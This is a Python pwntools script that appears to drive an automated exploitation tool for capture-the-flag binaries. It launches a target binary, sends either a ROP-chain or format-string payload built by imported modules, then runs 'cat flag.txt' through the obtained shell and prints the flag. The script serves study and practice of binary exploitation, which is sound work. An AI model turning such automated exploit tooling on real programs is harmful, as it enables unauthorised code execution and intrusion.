

#!/usr/bin/env python3
from pwn import *
import sys
from analyze import *
import Fart_FMT
import Fart_ROP
import time
import traceback

logging.getLogger('pwnlib').setLevel(logging.WARNING)

def exploit(analyize):
    binary = analyze.binary
    p = process(binary)
    payload = None
    
    if not analyze.has_leak():
        rop = Fart_ROP.ROP(analyze)
        send(rop.build_exploit(), p, analyze)
    else:
        fmt = Fart_FMT.FMT(analyze)
        send(fmt.build_exploit(), p, analyze)

def send(payload, p, analyze):
    if payload:
        p.sendline(payload)
        if analyze.has_binsh():
            sleep(0.1)
            p.sendline(b"cat flag.txt")
        p.recvuntil(b"flag")
        print(fire + " flag" + p.recvuntil(b"}").decode("utf-8") + " " + fire)

if __name__ == "__main__":
   
    try:
        
        binary = args.BIN
        if not binary:
            print("Usage: ./fart.py BIN=<path to binary>")
            sys.exit(-1)
        
        analyze = Analyze(binary)
        exploit(analyze)
    except Exception as e:
        print("[-] Well this stinks! We've encountered an exception we don't know how to handle!")
        print("Exception Type: " + str(e.__class__.__name__))
        print("Exception Message: " + str(e))
        print(traceback.format_exc())
